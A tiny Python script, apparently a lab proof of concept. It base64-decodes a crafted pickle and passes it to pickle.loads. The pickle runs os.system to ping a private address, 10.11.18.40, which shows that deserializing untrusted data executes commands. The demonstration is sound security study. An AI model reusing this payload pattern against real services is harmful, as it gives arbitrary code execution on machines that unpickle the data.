import pickle
import base64 

serial = b'gASVMQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBZwaW5nIC1jIDEwIDEwLjExLjE4LjQwlIWUUpQu'
decoded_serial = base64.b64decode(serial)
deserialised = pickle.loads(decoded_serial)
print(deserialised)
